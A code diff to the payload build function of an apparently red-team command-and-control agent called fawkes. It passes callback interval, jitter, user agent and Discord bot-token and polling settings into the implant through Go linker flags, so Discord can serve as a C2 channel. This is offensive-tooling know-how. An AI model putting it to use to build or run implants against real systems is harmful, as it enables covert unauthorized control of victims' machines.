@@ -347,21 +347,18 @@ func build(payloadBuildMsg agentstructs.PayloadBuildMessage) agentstructs.Payloa
 			}
 			ldflags += fmt.Sprintf(" -X '%s.callbackPort=%s'", fawkes_main_package, fmt.Sprintf("%d", int(val)))
 		} else if key == "callback_interval" {
-			val, err := payloadBuildMsg.C2Profiles[0].GetNumberArg(key)
-			if err != nil {
-				payloadBuildResponse.Success = false
-				payloadBuildResponse.BuildStdErr = err.Error()
-				return payloadBuildResponse
+			// Try number first (HTTP profile), then string (Discord profile)
+			if val, err := payloadBuildMsg.C2Profiles[0].GetNumberArg(key); err == nil {
+				ldflags += fmt.Sprintf(" -X '%s.sleepInterval=%d'", fawkes_main_package, int(val))
+			} else if val, err := payloadBuildMsg.C2Profiles[0].GetStringArg(key); err == nil && val != "" {
+				ldflags += fmt.Sprintf(" -X '%s.sleepInterval=%s'", fawkes_main_package, val)
 			}
-			ldflags += fmt.Sprintf(" -X '%s.sleepInterval=%s'", fawkes_main_package, fmt.Sprintf("%d", int(val)))
 		} else if key == "callback_jitter" {
-			val, err := payloadBuildMsg.C2Profiles[0].GetNumberArg(key)
-			if err != nil {
-				payloadBuildResponse.Success = false
-				payloadBuildResponse.BuildStdErr = err.Error()
-				return payloadBuildResponse
+			if val, err := payloadBuildMsg.C2Profiles[0].GetNumberArg(key); err == nil {
+				ldflags += fmt.Sprintf(" -X '%s.jitter=%d'", fawkes_main_package, int(val))
+			} else if val, err := payloadBuildMsg.C2Profiles[0].GetStringArg(key); err == nil && val != "" {
+				ldflags += fmt.Sprintf(" -X '%s.jitter=%s'", fawkes_main_package, val)
 			}
-			ldflags += fmt.Sprintf(" -X '%s.jitter=%s'", fawkes_main_package, fmt.Sprintf("%d", int(val)))
 		} else if key == "headers" {
 			headerMap, err := payloadBuildMsg.C2Profiles[0].GetDictionaryArg(key)
 			if err != nil {
@@ -400,6 +397,11 @@ func build(payloadBuildMsg agentstructs.PayloadBuildMessage) agentstructs.Payloa
 				return payloadBuildResponse
 			}
 			ldflags += fmt.Sprintf(" -X '%s.postURI=%s'", fawkes_main_package, val)
+		} else if key == "user_agent" {
+			// Discord C2 profile: user agent string (String type, distinct from HTTP "headers" dict)
+			if val, err := payloadBuildMsg.C2Profiles[0].GetStringArg(key); err == nil && val != "" {
+				ldflags += fmt.Sprintf(" -X '%s.userAgent=%s'", fawkes_main_package, val)
+			}
 		} else if key == "discord_token" {
 			// Discord C2 profile: bot token
 			val, err := payloadBuildMsg.C2Profiles[0].GetStringArg(key)
@@ -419,16 +421,14 @@ func build(payloadBuildMsg agentstructs.PayloadBuildMessage) agentstructs.Payloa
 			}
 			ldflags += fmt.Sprintf(" -X '%s.discordChannelID=%s'", fawkes_main_package, val)
 		} else if key == "message_checks" {
-			// Discord C2 profile: max polling attempts per exchange
-			val, err := payloadBuildMsg.C2Profiles[0].GetNumberArg(key)
-			if err == nil && int(val) > 0 {
-				ldflags += fmt.Sprintf(" -X '%s.discordPollChecks=%d'", fawkes_main_package, int(val))
+			// Discord C2 profile: max polling attempts per exchange (String type)
+			if val, err := payloadBuildMsg.C2Profiles[0].GetStringArg(key); err == nil && val != "" {
+				ldflags += fmt.Sprintf(" -X '%s.discordPollChecks=%s'", fawkes_main_package, val)
 			}
 		} else if key == "time_between_checks" {
-			// Discord C2 profile: seconds between polls
-			val, err := payloadBuildMsg.C2Profiles[0].GetNumberArg(key)
-			if err == nil && int(val) > 0 {
-				ldflags += fmt.Sprintf(" -X '%s.discordPollDelay=%d'", fawkes_main_package, int(val))
+			// Discord C2 profile: seconds between polls (String type)
+			if val, err := payloadBuildMsg.C2Profiles[0].GetStringArg(key); err == nil && val != "" {
+				ldflags += fmt.Sprintf(" -X '%s.discordPollDelay=%s'", fawkes_main_package, val)
 			}
 		}
 	}
